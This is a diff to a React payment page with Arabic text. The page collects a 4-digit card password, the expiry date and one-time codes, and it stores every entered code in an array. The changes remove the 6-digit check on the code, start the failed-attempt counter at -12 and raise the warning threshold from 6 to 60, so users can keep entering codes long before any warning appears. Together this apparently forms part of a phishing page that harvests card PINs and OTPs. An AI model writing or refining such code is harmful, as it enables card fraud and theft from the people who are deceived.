@@ -164,7 +164,7 @@ export default function Payment() {
   });
   const [countdown, setCountdown] = useState(60);
   const [isCountdownActive, setIsCountdownActive] = useState(true);
-  const [otpAttempts, setOtpAttempts] = useState(-2);
+  const [otpAttempts, setOtpAttempts] = useState(-12);
   const [otpValue, setOtpValue] = useState("");
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
@@ -674,7 +674,7 @@ export default function Payment() {
                           marginTop: 5,
                         }}
                       >
-                        {otpAttempts >= 6 && (
+                        {otpAttempts >= 60 && (
                           <div style={{ color: "#ff0000", marginTop: 2 }}>
                             سيتطلب مزيداً من التحقق بسبب فشل التحقق من الرمز
                           </div>
@@ -731,8 +731,7 @@ export default function Payment() {
                               paymentInfo.pass === "" ||
                               paymentInfo.month === "" ||
                               paymentInfo.year === "" ||
-                              paymentInfo.pass.length !== 4)) ||
-                          (step === 2 && paymentInfo.otp?.length !== 6)
+                              paymentInfo.pass.length !== 4))
                         }
                         onClick={() => {
                           if (step === 1) {
